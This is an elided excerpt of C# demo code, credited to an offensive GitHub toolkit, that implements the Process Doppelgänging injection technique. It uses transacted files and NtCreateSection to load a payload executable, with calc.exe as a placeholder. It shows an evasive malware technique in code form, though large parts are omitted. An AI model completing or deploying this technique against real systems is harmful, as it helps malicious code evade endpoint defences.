...
/// <summary>
/// https://raw.githubusercontent.com/n1xbyte/Toolkit/69c24f8cdd898f20ac3a79e81cc6bb61de8fa197/C%23%20Stuff/ProcessDopplegang.cs
/// </summary>
namespace ProcessInjectionDemo
{
    ...
    internal class Doppelganging
    {
        ...
        public static unsafe void Run(string[] args)
        {
            ...
            byte[] Payload = File.ReadAllBytes(@"C:\Users\James\Desktop\calc.exe");
            ...
            IntPtr hTransactedFile = CreateFileTransacted(@"C:\Users\James\Desktop\yolo.txt", 0xC0000000, 0, IntPtr.Zero, 2, 0x80, IntPtr.Zero, hTransaction, IntPtr.Zero, IntPtr.Zero);
            ...
            int CreateSectionStatus = NtCreateSection(ref hSection, 0xF001F, IntPtr.Zero, IntPtr.Zero, 0x2, 0x1000000, hTransactedFile);
            ...
            IntPtr uTargetPath = CreateUnicodeStruct("C:\\Users\\James\\Desktop");
            IntPtr uDllDir = CreateUnicodeStruct("C:\\Windows\\System32");
            IntPtr uCurrentDir = CreateUnicodeStruct("C:\\Users\\James\\Desktop");
